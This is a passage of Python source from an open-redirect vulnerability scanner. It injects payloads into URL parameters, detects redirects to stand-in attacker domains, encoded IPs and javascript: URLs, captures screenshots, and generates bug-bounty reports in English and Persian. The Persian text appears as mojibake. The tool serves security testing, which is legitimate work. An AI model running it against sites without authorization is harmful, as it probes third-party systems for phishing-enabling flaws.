                        confidence = param.confidence + 0.2
                        impact = self.assess_impact(location, payload)
                        remediation = self.get_remediation(param.context)
                        
                        # Take screenshot
                        screenshot_path = await self.take_screenshot(test_url, location)
                        
                        return Vulnerability(
                            url=test_url,
                            parameter=param.name,
                            payload=payload,
                            method=param.method,
                            response_code=response.status,
                            redirect_url=location,
                            context=param.context,
                            screenshot_path=screenshot_path,
                            timestamp=datetime.now().isoformat(),
                            vulnerability_type="open_redirect",
                            confidence=min(confidence, 1.0),
                            impact=impact,
                            remediation=remediation
                        )
                
                # Check DOM-based redirects
                content = await response.text()
                dom_vuln = self.check_dom_based_redirect(content, test_url, param, payload)
                if dom_vuln:
                    return dom_vuln
                    
        except Exception as e:
            self.logger.debug(f"[TEST-ERROR] {param.name}: {e}")
        
        return None
    
    def construct_test_url(self, param: Parameter, payload: str) -> str:
        """Construct test URL"""
        parsed = urlparse(param.url)
        
        if param.context == 'query':
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            query_params[param.name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        elif param.context == 'fragment':
            return f"{param.url.split('#')[0]}#{param.name}={quote(payload)}"
        else:
            separator = '&' if '?' in param.url else '?'
            return f"{param.url}{separator}{param.name}={quote(payload)}"
    
    def is_successful_redirect(self, location: str, payload: str) -> bool:
        """Check if redirect is successful"""
        if not location:
            return False
        
        location_lower = location.lower()
        decoded = unquote(location).lower()
        
        # Test domains from your payloads
        test_domains = [
            'google.com', 'evil.com', 'malicious.com', 'hacker.com',
            'metamask.io', 'uniswap.org', 'opensea.io', 'rarible.com',
            '216.58.214.206', '3627734734', '0xd8.0x3a.0xd6.0xce',
            'localdomain.pw'
        ]
        
        for domain in test_domains:
            if domain in location_lower or domain in decoded:
                return True
        
        # JavaScript execution
        if location_lower.startswith('javascript:') and ('confirm' in location_lower or 'prompt' in location_lower):
            return True
        
        # External domain redirect
        if location.startswith(('http://', 'https://')):
            redirect_domain = urlparse(location).netloc
            if redirect_domain != self.base_domain and redirect_domain not in ['', 'localhost']:
                return True
        
        # Protocol-relative URLs
        if location.startswith('//') and not location.startswith('//' + self.base_domain):
            return True
        
        return False
    
    def check_dom_based_redirect(self, content: str, test_url: str, param: Parameter, payload: str) -> Optional[Vulnerability]:
        """Check DOM-based redirects"""
        dom_patterns = [
            r'location\.href\s*=\s*([^;]+)',
            r'window\.location\s*=\s*([^;]+)',
            r'document\.location\s*=\s*([^;]+)',
            r'top\.location\s*=\s*([^;]+)',
            r'parent\.location\s*=\s*([^;]+)'
        ]
        
        for pattern in dom_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if param.name in match or payload in match:
                    return Vulnerability(
                        url=test_url,
                        parameter=param.name,
                        payload=payload,
                        method=param.method,
                        response_code=200,
                        redirect_url=match,
                        context=param.context,
                        timestamp=datetime.now().isoformat(),
                        vulnerability_type="dom_based_redirect",
                        confidence=0.8,
                        impact="HIGH",
                        remediation="Sanitize user input before DOM manipulation"
                    )
        
        return None
    
    def is_same_domain(self, url: str) -> bool:
        """Check if URL belongs to same domain"""
        try:
            parsed = urlparse(url)
            target_domain = parsed.netloc.lower()
            base_domain = self.base_domain.lower()
            
            return (target_domain == base_domain or 
                   target_domain.endswith(f'.{base_domain}') or
                   (target_domain.startswith('www.') and target_domain[4:] == base_domain))
        except:
            return False
    
    def is_redirect_parameter(self, param_name: str, param_value: str = "") -> bool:
        """Check if parameter is redirect-related"""
        param_lower = param_name.lower()
        value_lower = param_value.lower()
        
        # Check name
        name_match = any(pattern in param_lower for pattern in self.redirect_patterns)
        
        # Check value
        value_match = bool(re.match(r'https?://', value_lower) or 
                          re.match(r'//', value_lower) or
                          ('.' in value_lower and len(value_lower) > 3))
        
        return name_match or value_match
    
    def calculate_confidence(self, param_name: str, param_value: str, context: str) -> float:
        """Calculate confidence score"""
        confidence = 0.0
        
        context_scores = {
            'query': 0.6, 'fragment': 0.7, 'form_input': 0.5,
            'javascript': 0.4, 'web3_config': 0.8, 'http_header': 0.9
        }
        confidence += context_scores.get(context, 0.3)
        
        if self.is_redirect_parameter(param_name):
            confidence += 0.3
        
        if param_value and (param_value.startswith(('http', '//', 'javascript:')) or 
                           '.' in param_value and len(param_value) > 5):
            confidence += 0.2
        
        return min(confidence, 1.0)
    
    def assess_impact(self, redirect_url: str, payload: str) -> str:
        """Assess vulnerability impact"""
        if redirect_url.startswith('javascript:'):
            return "CRITICAL"
        elif redirect_url.startswith(('http://', 'https://')):
            redirect_domain = urlparse(redirect_url).netloc
            if redirect_domain != self.base_domain:
                return "HIGH"
        elif 'web3://' in redirect_url or 'ipfs://' in redirect_url:
            return "HIGH"
        return "MEDIUM"
    
    def get_remediation(self, context: str) -> str:
        """Get remediation advice"""
        remediations = {
            'query': "Validate URL parameters against allowlist of permitted domains",
            'fragment': "Implement client-side validation for fragment parameters",
            'form_input': "Validate form inputs server-side before processing",
            'javascript': "Sanitize user input before JavaScript redirects",
            'web3_config': "Validate Web3 URLs against trusted provider allowlist",
            'http_header': "Validate redirect headers on server-side"
        }
        return remediations.get(context, "Implement proper input validation and use allowlist approach")
    
    async def take_screenshot(self, url: str, redirect_url: str = None) -> Optional[str]:
        """Take professional PoC screenshot"""
        if not self.driver:
            return None
        
        try:
            screenshots_dir = Path("screenshots")
            screenshots_dir.mkdir(exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
            filename = f"ultimate_poc_{timestamp}_{url_hash}.png"
            screenshot_path = screenshots_dir / filename
            
            # Navigate and take screenshot
            self.driver.get(url)
            await asyncio.sleep(3)  # Wait for JavaScript execution
            self.driver.save_screenshot(str(screenshot_path))
            
            # If redirect occurred, also screenshot final page
            if redirect_url and redirect_url != url:
                try:
                    final_filename = f"final_{timestamp}_{url_hash}.png"
                    final_path = screenshots_dir / final_filename
                    self.driver.get(redirect_url)
                    await asyncio.sleep(2)
                    self.driver.save_screenshot(str(final_path))
                except:
                    pass
            
            return str(screenshot_path)
            
        except Exception as e:
            self.logger.error(f"[POC-ERROR] Screenshot failed: {e}")
            return None
    
    def phase4_report_generation(self):
        """Phase 4: Complete report generation"""
        print("\\nüíæ [PHASE-4] COMPLETE REPORT GENERATION")
        print("‚ñà" * 60)
        
        # Save JSON results
        self.save_json_results()
        
        # Generate HTML report with Matrix theme
        self.generate_matrix_html_report()
        
        # Generate CSV analysis
        self.save_csv_analysis()
        
        # Generate bug bounty reports if vulnerabilities found
        if self.vulnerabilities:
            self.generate_bug_bounty_reports()
    
    def save_json_results(self):
        """Save complete JSON results"""
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        web3_params = [p for p in self.parameters if p.source == 'web3']
        js_params = [p for p in self.parameters if p.source == 'javascript']
        
        results_data = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'scanner_version': 'Ultimate Hunter v3.0 - Complete Edition',
                'total_parameters': len(self.parameters),
                'redirect_parameters': len(redirect_params),
                'web3_parameters': len(web3_params),
                'javascript_parameters': len(js_params),
                'vulnerabilities_found': len(self.vulnerabilities),
                'web3_detected': len(web3_params) > 0,
                'payload_count': len(self.payloads)
            },
            'statistics': {
                'urls_discovered': len(self.discovered_urls),
                'js_files_analyzed': len(self.js_files),
                'high_confidence_params': len([p for p in self.parameters if p.confidence > 0.7]),
                'medium_confidence_params': len([p for p in self.parameters if 0.4 <= p.confidence <= 0.7]),
                'low_confidence_params': len([p for p in self.parameters if p.confidence < 0.4])
            },
            'parameters': [asdict(param) for param in self.parameters],
            'vulnerabilities': [asdict(vuln) for vuln in self.vulnerabilities]
        }
        
        with open('complete_results.json', 'w', encoding='utf-8') as f:
            json.dump(results_data, f, indent=2, ensure_ascii=False)
        
        print("[STORAGE] Complete results saved: complete_results.json")
    
    def save_csv_analysis(self):
        """Save CSV analysis"""
        with open('complete_analysis.csv', 'w', newline='', encoding='utf-8') as csvfile:
            fieldnames = [
                'name', 'value', 'source', 'context', 'url', 'method',
                'is_redirect_related', 'confidence', 'vulnerability_found'
            ]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            
            vuln_params = {v.parameter for v in self.vulnerabilities}
            
            for param in self.parameters:
                writer.writerow({
                    'name': param.name,
                    'value': param.value[:200],  # Limit length
                    'source': param.source,
                    'context': param.context,
                    'url': param.url,
                    'method': param.method,
                    'is_redirect_related': param.is_redirect_related,
                    'confidence': f"{param.confidence:.3f}",
                    'vulnerability_found': param.name in vuln_params
                })
        
        print("[STORAGE] CSV analysis saved: complete_analysis.csv")
    
    def generate_matrix_html_report(self):
        """Generate Matrix-themed HTML report"""
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        web3_params = [p for p in self.parameters if p.source == 'web3']
        js_params = [p for p in self.parameters if p.source == 'javascript']
        
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>üî• ULTIMATE HUNTER REPORT üî•</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        
        body {{
            font-family: 'Orbitron', 'Courier New', monospace;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff41;
            min-height: 100vh;
            background-attachment: fixed;
        }}
        
        .matrix-bg {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(circle at 25% 25%, #00ff41 1px, transparent 1px),
                radial-gradient(circle at 75% 75%, #00ff41 1px, transparent 1px);
            background-size: 50px 50px;
            opacity: 0.1;
            z-index: -1;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ff41;
            border-radius: 10px;
            box-shadow: 0 0 30px #00ff41;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }}
        
        .header {{
            background: linear-gradient(135deg, #000000 0%, #1a1a2e 100%);
            color: #00ff41;
            padding: 30px;
            text-align: center;
            border-bottom: 2px solid #00ff41;
            position: relative;
        }}
        
        .header::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, #00ff41, transparent);
            height: 2px;
            animation: scan 2s infinite;
        }}
        
        @keyframes scan {{
            0% {{ transform: translateX(-100%); }}
            100% {{ transform: translateX(100%); }}
        }}
        
        .header h1 {{
            margin: 0;
            font-size: 2.5em;
            font-weight: 900;
            text-shadow: 0 0 20px #00ff41;
            letter-spacing: 2px;
        }}
        
        .content {{
            padding: 30px;
        }}
        
        .summary {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        
        .summary-card {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border: 1px solid #00ff41;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
        }}
        
        .summary-card h3 {{
            margin: 0 0 10px 0;
            color: #00ff41;
            font-size: 1.2em;
        }}
        
        .summary-card .number {{
            font-size: 2.5em;
            font-weight: 900;
            color: #00ff41;
            text-shadow: 0 0 10px #00ff41;
        }}
        
        .vulnerability {{
            background: linear-gradient(135deg, #2d1b1b 0%, #1a0f0f 100%);
            border: 2px solid #ff4444;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 0 20px rgba(255, 68, 68, 0.4);
        }}
        
        .vulnerability.critical {{
            border-color: #ff0000;
            box-shadow: 0 0 25px rgba(255, 0, 0, 0.6);
        }}
        
        .parameter {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            border: 1px solid #00ff41;
            border-radius: 6px;
            padding: 15px;
            margin: 15px 0;
            box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
        }}
        
        .parameter.redirect {{
            border-color: #ff4444;
            box-shadow: 0 0 10px rgba(255, 68, 68, 0.3);
        }}
        
        .code {{
            background: #000000;
            color: #00ff41;
            padding: 15px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            border: 1px solid #00ff41;
            overflow-x: auto;
        }}
        
        .success {{ color: #00ff41; font-weight: bold; text-shadow: 0 0 5px #00ff41; }}
        .error {{ color: #ff4444; font-weight: bold; text-shadow: 0 0 5px #ff4444; }}
        .critical {{ color: #ff0000; font-weight: bold; text-shadow: 0 0 5px #ff0000; }}
        
        .screenshot {{ 
            max-width: 100%; 
            border: 2px solid #00ff41; 
            border-radius: 8px; 
            margin: 10px 0;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
        }}
        
        .blink {{
            animation: blink 1s infinite;
        }}
        
        @keyframes blink {{
            0%, 50% {{ opacity: 1; }}
            51%, 100% {{ opacity: 0; }}
        }}
    </style>
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="container">
        <div class="header">
            <h1>üî• ULTIMATE HUNTER REPORT üî•</h1>
            <p>CLASSIFIED SECURITY ASSESSMENT</p>
            <p class="blink">‚óè SYSTEM STATUS: OPERATIONAL ‚óè</p>
        </div>
        
        <div class="content">
            <div style="background: #000; color: #00ff41; padding: 20px; border: 1px solid #00ff41; margin-bottom: 30px;">
                <p>TARGET: {self.target_url}</p>
                <p>SCAN DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p>SCANNER: Ultimate Hunter v3.0 - Complete Edition</p>
                <p>PAYLOADS: {len(self.payloads)} custom payloads loaded</p>
                <p>CLASSIFICATION: CONFIDENTIAL</p>
            </div>
            
            <div class="summary">
                <div class="summary-card">
                    <h3>TARGET DOMAIN</h3>
                    <div class="number">{self.base_domain}</div>
                </div>
                <div class="summary-card">
                    <h3>URLs SCANNED</h3>
                    <div class="number">{len(self.discovered_urls)}</div>
                </div>
                <div class="summary-card">
                    <h3>PARAMETERS</h3>
                    <div class="number">{len(self.parameters)}</div>
                </div>
                <div class="summary-card">
                    <h3>REDIRECT PARAMS</h3>
                    <div class="number">{len(redirect_params)}</div>
                </div>
                <div class="summary-card">
                    <h3>WEB3 PARAMS</h3>
                    <div class="number">{len(web3_params)}</div>
                </div>
                <div class="summary-card">
                    <h3>JS PARAMS</h3>
                    <div class="number">{len(js_params)}</div>
                </div>
                <div class="summary-card">
                    <h3>VULNERABILITIES</h3>
                    <div class="number {'error' if len(self.vulnerabilities) > 0 else 'success'}">{len(self.vulnerabilities)}</div>
                </div>
                <div class="summary-card">
                    <h3>PAYLOADS USED</h3>
                    <div class="number">{len(self.payloads)}</div>
                </div>
            </div>
'''
        
        if self.vulnerabilities:
            html_content += "<h2 class='error'>üö® VULNERABILITIES DETECTED üö®</h2>\\n"
            for i, vuln in enumerate(self.vulnerabilities, 1):
                html_content += f'''
            <div class="vulnerability {vuln.impact.lower()}">
                <h3>VULNERABILITY #{i}: {vuln.vulnerability_type.upper()}</h3>
                <p><strong>URL:</strong> <code>{vuln.url}</code></p>
                <p><strong>PARAMETER:</strong> <code>{vuln.parameter}</code></p>
                <p><strong>PAYLOAD:</strong></p>
                <div class="code">{vuln.payload}</div>
                <p><strong>RESPONSE CODE:</strong> {vuln.response_code}</p>
                <p><strong>REDIRECT URL:</strong> <code>{vuln.redirect_url}</code></p>
                <p><strong>IMPACT:</strong> <span class="{vuln.impact.lower()}">{vuln.impact}</span></p>
                <p><strong>CONFIDENCE:</strong> {vuln.confidence:.1%}</p>
                <p><strong>REMEDIATION:</strong> {vuln.remediation}</p>
'''
                if vuln.screenshot_path:
                    html_content += f'''
                <div>
                    <h4>üì∏ PROOF OF CONCEPT:</h4>
                    <img src="{vuln.screenshot_path}" class="screenshot">
                </div>
'''
                html_content += "</div>\\n"
        else:
            html_content += '''
            <div style="text-align: center; padding: 40px; background: rgba(0, 255, 65, 0.1); border-radius: 8px; border: 1px solid #00ff41;">
                <h2 class="success">‚úÖ NO VULNERABILITIES DETECTED ‚úÖ</h2>
                <p>TARGET APPEARS SECURE AGAINST OPEN REDIRECT ATTACKS</p>
                <p>DEFENSIVE SYSTEMS: OPERATIONAL</p>
            </div>
'''
        
        html_content += f'''
            <h2>üîç DISCOVERED PARAMETERS</h2>
            <div style="background: #000; color: #00ff41; padding: 15px; border: 1px solid #00ff41; margin-bottom: 20px;">
                <p>TOTAL PARAMETERS: {len(self.parameters)}</p>
                <p>‚îú‚îÄ REDIRECT-RELATED: {len(redirect_params)}</p>
                <p>‚îú‚îÄ WEB3 PARAMETERS: {len(web3_params)}</p>
                <p>‚îú‚îÄ JAVASCRIPT PARAMETERS: {len(js_params)}</p>
                <p>‚îî‚îÄ HIGH-CONFIDENCE: {len([p for p in self.parameters if p.confidence > 0.7])}</p>
            </div>
'''
        
        # Show priority parameters
        priority_params = [p for p in self.parameters if p.is_redirect_related or p.confidence > 0.7]
        for param in priority_params[:20]:  # Show first 20
            redirect_class = "redirect" if param.is_redirect_related else ""
            html_content += f'''
            <div class="parameter {redirect_class}">
                <h4>{param.name} {'[REDIRECT-RELATED]' if param.is_redirect_related else ''} {'[WEB3]' if param.source == 'web3' else ''}</h4>
                <p><strong>VALUE:</strong> <code>{param.value[:150]}{'...' if len(param.value) > 150 else ''}</code></p>
                <p><strong>SOURCE:</strong> {param.source.upper()} | <strong>CONTEXT:</strong> {param.context.upper()}</p>
                <p><strong>URL:</strong> <code>{param.url}</code></p>
                <p><strong>CONFIDENCE:</strong> {param.confidence:.1%}</p>
            </div>
'''
        
        html_content += f'''
            <div style="text-align: center; margin-top: 40px; padding-top: 20px; border-top: 1px solid #00ff41;">
                <p class="blink">‚óè REPORT GENERATED BY ULTIMATE HUNTER v3.0 - COMPLETE EDITION ‚óè</p>
                <p>TIMESTAMP: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p>CLASSIFICATION: CONFIDENTIAL</p>
            </div>
        </div>
    </div>
</body>
</html>
'''
        
        with open('ultimate_matrix_report.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print("[REPORT] Ultimate Matrix-themed report: ultimate_matrix_report.html")
    
    def generate_bug_bounty_reports(self):
        """Generate professional bug bounty reports"""
        for i, vuln in enumerate(self.vulnerabilities, 1):
            # English report
            english_report = f"""# Open Redirect Vulnerability Report #{i}

## Executive Summary
- **Target**: {self.target_url}
- **Vulnerability Type**: {vuln.vulnerability_type.title()}
- **Severity**: {vuln.impact}
- **CVSS Score**: {self.calculate_cvss(vuln):.1f}
- **Parameter**: {vuln.parameter}
- **Discovery Date**: {vuln.timestamp}

## Technical Details
- **Vulnerable URL**: `{vuln.url}`
- **Vulnerable Parameter**: `{vuln.parameter}`
- **Payload Used**: `{vuln.payload}`
- **HTTP Method**: {vuln.method}
- **Response Code**: {vuln.response_code}
- **Redirect URL**: `{vuln.redirect_url}`
- **Context**: {vuln.context}
- **Confidence Level**: {vuln.confidence:.1%}

## Proof of Concept
### Steps to Reproduce:
1. Navigate to the vulnerable URL: `{vuln.url}`
2. Observe the vulnerable parameter: `{vuln.parameter}`
3. Inject the malicious payload: `{vuln.payload}`
4. Verify the redirect to: `{vuln.redirect_url}`

### Expected Result:
The application redirects the user to the attacker-controlled domain, demonstrating the open redirect vulnerability.

## Impact Assessment
This open redirect vulnerability allows an attacker to redirect users to malicious websites, potentially leading to:

- **Phishing Attacks**: Users can be redirected to fake login pages
- **Credential Theft**: Sensitive information can be stolen
- **Session Hijacking**: User sessions can be compromised
- **Malware Distribution**: Users can be redirected to malicious downloads
- **SEO Poisoning**: Search engine rankings can be manipulated

### Business Impact:
- Loss of user trust and reputation damage
- Potential data breaches and privacy violations
- Regulatory compliance issues
- Financial losses due to fraud

## Remediation Recommendations
{vuln.remediation}

### Additional Security Measures:
1. Implement strict input validation for all redirect parameters
2. Use allowlist-based validation for redirect destinations
3. Implement proper URL parsing and validation
4. Add security warnings for external redirects
5. Regular security testing and code reviews

## References
- [OWASP Testing Guide - Open Redirect](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/04-Testing_for_Client_Side_URL_Redirect)
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---
**Report generated by Ultimate Open Redirect Hunter v3.0**  
**Timestamp**: {vuln.timestamp}  
**Scanner**: Complete Edition with 248 custom payloads
"""
            
            # Persian report
            persian_report = f"""# ⁄Øÿ≤ÿßÿ±ÿ¥ ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å Open Redirect ÿ¥ŸÖÿßÿ±Ÿá {i}

## ÿÆŸÑÿßÿµŸá ÿßÿ¨ÿ±ÿß€å€å
- **ŸáÿØŸÅ**: {self.target_url}
- **ŸÜŸàÿπ ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å**: {vuln.vulnerability_type}
- **ÿ¥ÿØÿ™**: {vuln.impact}
- **ÿßŸÖÿ™€åÿßÿ≤ CVSS**: {self.calculate_cvss(vuln):.1f}
- **Ÿæÿßÿ±ÿßŸÖÿ™ÿ±**: {vuln.parameter}
- **ÿ™ÿßÿ±€åÿÆ ⁄©ÿ¥ŸÅ**: {vuln.timestamp}

## ÿ¨ÿ≤ÿ¶€åÿßÿ™ ŸÅŸÜ€å
- **URL ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±**: `{vuln.url}`
- **Ÿæÿßÿ±ÿßŸÖÿ™ÿ± ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±**: `{vuln.parameter}`
- **Payload ÿßÿ≥ÿ™ŸÅÿßÿØŸá ÿ¥ÿØŸá**: `{vuln.payload}`
- **ŸÖÿ™ÿØ HTTP**: {vuln.method}
- **⁄©ÿØ Ÿæÿßÿ≥ÿÆ**: {vuln.response_code}
- **URL ÿßŸÜÿ™ŸÇÿßŸÑ**: `{vuln.redirect_url}`
- **Context**: {vuln.context}
- **ÿ≥ÿ∑ÿ≠ ÿßÿπÿ™ŸÖÿßÿØ**: {vuln.confidence:.1%}

## ÿßÿ´ÿ®ÿßÿ™ ŸÖŸÅŸáŸàŸÖ (PoC)
### ŸÖÿ±ÿßÿ≠ŸÑ ÿ™⁄©ÿ±ÿßÿ±:
1. ÿ®Ÿá URL ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ± ÿ®ÿ±Ÿà€åÿØ: `{vuln.url}`
2. Ÿæÿßÿ±ÿßŸÖÿ™ÿ± ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ± ÿ±ÿß ŸÖÿ¥ÿßŸáÿØŸá ⁄©ŸÜ€åÿØ: `{vuln.parameter}`
3. Payload ŸÖÿÆÿ±ÿ® ÿ±ÿß ÿ™ÿ≤ÿ±€åŸÇ ⁄©ŸÜ€åÿØ: `{vuln.payload}`
4. ÿßŸÜÿ™ŸÇÿßŸÑ ÿ®Ÿá ÿ¢ÿØÿ±ÿ≥ ÿ≤€åÿ± ÿ±ÿß ÿ™ÿ£€å€åÿØ ⁄©ŸÜ€åÿØ: `{vuln.redirect_url}`

### ŸÜÿ™€åÿ¨Ÿá ŸÖŸàÿ±ÿØ ÿßŸÜÿ™ÿ∏ÿßÿ±:
ÿ®ÿ±ŸÜÿßŸÖŸá ⁄©ÿßÿ±ÿ®ÿ± ÿ±ÿß ÿ®Ÿá ÿØÿßŸÖŸÜŸá ⁄©ŸÜÿ™ÿ±ŸÑ ÿ¥ÿØŸá ÿ™Ÿàÿ≥ÿ∑ ŸÖŸáÿßÿ¨ŸÖ ŸáÿØÿß€åÿ™ ŸÖ€å‚Äå⁄©ŸÜÿØ ⁄©Ÿá ŸÜÿ¥ÿßŸÜ‚ÄåÿØŸáŸÜÿØŸá ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å open redirect ÿßÿ≥ÿ™.

## ÿßÿ±ÿ≤€åÿßÿ®€å ÿ™ÿ£ÿ´€åÿ±
ÿß€åŸÜ ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å open redirect ÿ®Ÿá ŸÖŸáÿßÿ¨ŸÖ ÿßÿ¨ÿßÿ≤Ÿá ŸÖ€å‚ÄåÿØŸáÿØ ⁄©ÿßÿ±ÿ®ÿ±ÿßŸÜ ÿ±ÿß ÿ®Ÿá ÿ≥ÿß€åÿ™‚ÄåŸáÿß€å ŸÖÿÆÿ±ÿ® ŸáÿØÿß€åÿ™ ⁄©ŸÜÿØ ⁄©Ÿá ŸÖ€å‚Äåÿ™ŸàÿßŸÜÿØ ŸÖŸÜÿ¨ÿ± ÿ¥ŸàÿØ ÿ®Ÿá:

- **ÿ≠ŸÖŸÑÿßÿ™ ŸÅ€åÿ¥€åŸÜ⁄Ø**: ⁄©ÿßÿ±ÿ®ÿ±ÿßŸÜ ÿ®Ÿá ÿµŸÅÿ≠ÿßÿ™ ÿ¨ÿπŸÑ€å ŸáÿØÿß€åÿ™ ŸÖ€å‚Äåÿ¥ŸàŸÜÿØ
- **ÿ≥ÿ±ŸÇÿ™ ÿßÿ∑ŸÑÿßÿπÿßÿ™**: ÿßÿ∑ŸÑÿßÿπÿßÿ™ ÿ≠ÿ≥ÿßÿ≥ ÿ≥ÿ±ŸÇÿ™ ŸÖ€å‚Äåÿ¥ŸàÿØ
- **ÿ±ÿ®ŸàÿØŸÜ Session**: ÿ¨ŸÑÿ≥ÿßÿ™ ⁄©ÿßÿ±ÿ®ÿ±€å ÿØÿ± ŸÖÿπÿ±ÿ∂ ÿÆÿ∑ÿ± ŸÇÿ±ÿßÿ± ŸÖ€å‚Äå⁄Ø€åÿ±ÿØ
- **ÿ™Ÿàÿ≤€åÿπ ÿ®ÿØÿßŸÅÿ≤ÿßÿ±**: ⁄©ÿßÿ±ÿ®ÿ±ÿßŸÜ ÿ®Ÿá ÿØÿßŸÜŸÑŸàÿØŸáÿß€å ŸÖÿÆÿ±ÿ® ŸáÿØÿß€åÿ™ ŸÖ€å‚Äåÿ¥ŸàŸÜÿØ
- **ŸÖÿ≥ŸÖŸàŸÖ€åÿ™ SEO**: ÿ±ÿ™ÿ®Ÿá‚Äåÿ®ŸÜÿØ€å ŸÖŸàÿ™Ÿàÿ±Ÿáÿß€å ÿ¨ÿ≥ÿ™ÿ¨Ÿà ÿØÿ≥ÿ™⁄©ÿßÿ±€å ŸÖ€å‚Äåÿ¥ŸàÿØ

### ÿ™ÿ£ÿ´€åÿ± ÿ™ÿ¨ÿßÿ±€å:
- ÿßÿ≤ ÿØÿ≥ÿ™ ÿØÿßÿØŸÜ ÿßÿπÿ™ŸÖÿßÿØ ⁄©ÿßÿ±ÿ®ÿ±ÿßŸÜ Ÿà ÿ¢ÿ≥€åÿ® ÿ®Ÿá ÿ¥Ÿáÿ±ÿ™
- ŸÜŸÇÿ∂ ÿØÿßÿØŸá‚ÄåŸáÿß Ÿà ŸÖÿ¥⁄©ŸÑÿßÿ™ ÿ≠ÿ±€åŸÖ ÿÆÿµŸàÿµ€å
- ŸÖÿ≥ÿßÿ¶ŸÑ ÿßŸÜÿ∑ÿ®ÿßŸÇ ÿ®ÿß ŸÇŸàÿßŸÜ€åŸÜ
- ÿ∂ÿ±ÿ±Ÿáÿß€å ŸÖÿßŸÑ€å ŸÜÿßÿ¥€å ÿßÿ≤ ⁄©ŸÑÿßŸáÿ®ÿ±ÿØÿßÿ±€å

## ÿ™Ÿàÿµ€åŸá‚ÄåŸáÿß€å ÿ±ŸÅÿπ ÿ¢ÿ≥€åÿ®‚ÄåŸæÿ∞€åÿ±€å
{vuln.remediation}

### ÿßŸÇÿØÿßŸÖÿßÿ™ ÿßŸÖŸÜ€åÿ™€å ÿßÿ∂ÿßŸÅ€å:
1. Ÿæ€åÿßÿØŸá‚Äåÿ≥ÿßÿ≤€å ÿßÿπÿ™ÿ®ÿßÿ±ÿ≥ŸÜÿ¨€å ÿ≥ÿÆÿ™‚Äå⁄Ø€åÿ±ÿßŸÜŸá Ÿàÿ±ŸàÿØ€å ÿ®ÿ±ÿß€å ÿ™ŸÖÿßŸÖ Ÿæÿßÿ±ÿßŸÖÿ™ÿ±Ÿáÿß€å redirect
2. ÿßÿ≥ÿ™ŸÅÿßÿØŸá ÿßÿ≤ ÿßÿπÿ™ÿ®ÿßÿ±ÿ≥ŸÜÿ¨€å ŸÖÿ®ÿ™ŸÜ€å ÿ®ÿ± ŸÅŸáÿ±ÿ≥ÿ™ ŸÖÿ¨ÿßÿ≤ ÿ®ÿ±ÿß€å ŸÖŸÇÿßÿµÿØ redirect
3. Ÿæ€åÿßÿØŸá‚Äåÿ≥ÿßÿ≤€å ÿ™ÿ¨ÿ≤€åŸá Ÿà ÿßÿπÿ™ÿ®ÿßÿ±ÿ≥ŸÜÿ¨€å ÿµÿ≠€åÿ≠ URL
4. ÿßÿ∂ÿßŸÅŸá ⁄©ÿ±ÿØŸÜ Ÿáÿ¥ÿØÿßÿ±Ÿáÿß€å ÿßŸÖŸÜ€åÿ™€å ÿ®ÿ±ÿß€å redirectŸáÿß€å ÿÆÿßÿ±ÿ¨€å
5. ÿ™ÿ≥ÿ™ ÿßŸÖŸÜ€åÿ™€å ŸÖŸÜÿ∏ŸÖ Ÿà ÿ®ÿßÿ≤ÿ®€åŸÜ€å ⁄©ÿØ

---
**⁄Øÿ≤ÿßÿ±ÿ¥ ÿ™ŸàŸÑ€åÿØ ÿ¥ÿØŸá ÿ™Ÿàÿ≥ÿ∑ Ultimate Open Redirect Hunter v3.0**  
**ÿ≤ŸÖÿßŸÜ**: {vuln.timestamp}  
